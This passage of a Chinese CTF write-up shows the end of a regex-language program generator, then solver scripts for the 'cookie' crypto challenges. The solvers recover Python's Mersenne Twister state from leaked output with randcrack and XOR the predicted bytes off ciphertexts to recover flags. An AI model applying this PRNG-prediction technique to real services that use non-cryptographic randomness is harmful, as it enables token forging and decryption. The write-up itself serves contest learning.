</span></span></span><span class="line"><span class="cl"><span class="s1">    把【^&lt;(.*)\n(.*,)(\d+,)\n(.*)\n(.*)】替换成【\1\n\2\n\3\4\n\5】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">    把【^\+(.*)\n(.*)\n(\d+,)(.*)\n(.*)】替换成【\1\n\2\n1\3\4\n\5】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">    把【^-(.*)\n(.*)\n(\d+,)(.*)\n(.*)】替换成【\1\n\2\n9\3\4\n\5】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">    把【^\.(.*)\n(.*)\n((\d+,).*)\n(.*)】替换成【\1\n\2\n\3\n\5\4】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    把【19】替换成【】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">    把【91】替换成【】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    如果看到【^\w(.*)\n(.*)\n0,(.*)\n(.*)】就跳转到【跳过循环】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">    继续循环：
</span></span></span><span class="line"><span class="cl"><span class="s1">        把【^((\w)(.*?)\2.*)\n(.*)\n(.*)\n(.*)】替换成【\3\1\n\4\n\5\n\6】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">        如果看到【.】就跳转到【结束循环】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    跳过循环：
</span></span></span><span class="line"><span class="cl"><span class="s1">        把【^(\w).*?\1(.*)\n(.*)\n(.*)\n(.*)】替换成【\2\n\3\n\4\n\5】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">        如果看到【.】就跳转到【结束循环】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">    结束循环：
</span></span></span><span class="line"><span class="cl"><span class="s1">        如果没看到【^\n】就跳转到【开始】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">结束：
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="sa">rf</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">把【^(.*)\n(.*)\n(.*)\n(.*)】替换成【\4】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【90】替换成【</span><span class="si">{</span><span class="s1">&#39;1&#39;</span><span class="o">*</span><span class="mi">255</span><span class="si">}</span><span class="s1">】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">重复把【91】替换成【】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">把【0】替换成【】喵
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">123</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">i1</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span> <span class="o">*</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">char</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\\\\</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;把【</span><span class="si">{</span><span class="n">i1</span><span class="si">}</span><span class="s1">】替换成【</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;把【,】替换成【】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;把【1111111111】替换成【】喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;谢谢喵</span><span class="se">\n</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<h3 id="21-小章鱼的曲奇">21. 小章鱼的曲奇</h3>
<h4 id="smol-cookie">Smol Cookie</h4>
<p>查看服务器代码，需要用已知的 2500 个字符预测 random 的随机数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">the_void</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">secrets</span><span class="o">.</span><span class="n">randbits</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">smol_cookie</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;flag</span><span class="si">{test}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">words</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">2500</span> <span class="o">+</span> <span class="n">smol_cookie</span>
</span></span><span class="line"><span class="cl"><span class="n">ancient_words</span> <span class="o">=</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">words</span><span class="p">,</span> <span class="n">the_void</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">words</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ancient_words</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>找到了 <a href="https://github.com/tna0y/Python-random-module-cracker">Python-random-module-cracker</a>，它可以根据 624 * 4 个字符预测 random 下一个生成的随机数。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">randcrack</span> <span class="kn">import</span> <span class="n">RandCrack</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rc</span> <span class="o">=</span> <span class="n">RandCrack</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">hexData</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hexData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">624</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">rc</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">:</span><span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leftData</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="mi">624</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">leftDataLen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">leftData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">leftData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leftRandomInts</span> <span class="o">=</span> <span class="p">[</span><span class="n">rc</span><span class="o">.</span><span class="n">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">leftDataLen</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">leftRandomBytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">leftRandomInts</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">leftRandomBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_arrays</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xorResult</span> <span class="o">=</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">leftData</span><span class="p">,</span> <span class="n">leftRandomBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">xorResult</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="big-cookie">Big Cookie</h4>
<p>服务端用 22 位的 <code>entropy</code> 初始化两个已知种子的 random</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">seed1</span> <span class="o">=</span> <span class="mh">0x432c9c5c65b91b13981990a545ac52361bb67cec7326ed0036fdf7ee840dfd81</span>
</span></span><span class="line"><span class="cl"><span class="n">seed2</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">seed1</span> <span class="o">!=</span> <span class="n">seed2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">void1</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">seed1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">void2</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">seed2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">void3</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">secrets</span><span class="o">.</span><span class="n">randbits</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">entropy</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">randbits</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">void1</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">entropy</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">void2</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">entropy</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">big_cookie</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;flag</span><span class="si">{test}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">words</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">2500</span> <span class="o">+</span> <span class="n">big_cookie</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ancient_words</span> <span class="o">=</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">words</span><span class="p">,</span> <span class="n">void1</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">n</span><span class="p">),</span> <span class="n">void2</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">n</span><span class="p">),</span> <span class="n">void3</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ancient_words</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>本来打算枚举一下，结果发现好像和 <code>entropy</code> 无关。任何 <code>entropy</code> 都可以得到 flag：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">randcrack</span> <span class="kn">import</span> <span class="n">RandCrack</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">seed1</span> <span class="o">=</span> <span class="mh">0x432c9c5c65b91b13981990a545ac52361bb67cec7326ed0036fdf7ee840dfd81</span>
</span></span><span class="line"><span class="cl"><span class="n">seed2</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;2.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">hexData</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hexData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_arrays</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crash</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">rc</span> <span class="o">=</span> <span class="n">RandCrack</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed624</span> <span class="o">=</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">a</span><span class="p">[:</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">],</span> <span class="n">b</span><span class="p">[:</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">],</span> <span class="n">ciphertext</span><span class="p">[:</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">624</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">rc</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">seed624</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">:</span><span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">leftLength</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">    <span class="n">seedLeft</span> <span class="o">=</span> <span class="p">[</span><span class="n">rc</span><span class="o">.</span><span class="n">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">leftLength</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">seedLeftBytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">seedLeft</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">xor_arrays</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">:],</span> <span class="n">seedLeftBytes</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">:],</span> <span class="n">b</span><span class="p">[</span><span class="mi">624</span> <span class="o">*</span> <span class="mi">4</span><span class="p">:])</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r1</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">seed1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r2</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">seed2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">r1</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r2</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">r1</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">crash</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">check</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="supa-big-cookie">SUPA BIG Cookie</h4>
<p>题目代码是这样的：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rounds_of_curses</span> <span class="o">=</span> <span class="mi">100</span>
</span></span><span class="line"><span class="cl"><span class="n">curses</span> <span class="o">=</span> <span class="p">[</span><span class="n">secrets</span><span class="o">.</span><span class="n">randbits</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds_of_curses</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span> <span class="o">+</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="n">curses</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">its_seeds</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">curse</span><span class="p">,</span> <span class="n">its_seed</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">curses</span><span class="p">,</span> <span class="n">its_seeds</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">curse</span><span class="p">)</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="mi">2500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">t2</span> <span class="o">=</span> <span class="n">Random</span><span class="p">(</span><span class="n">its_seed</span><span class="p">)</span><span class="o">.</span><span class="n">randbytes</span><span class="p">(</span><span class="mi">2500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">t1</span> <span class="o">!=</span> <span class="n">t2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;YOU DEMISE HAS OCCURRED.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">quit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>好像只需要把传过来的发回去就行了。我手速不够快，所以用代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
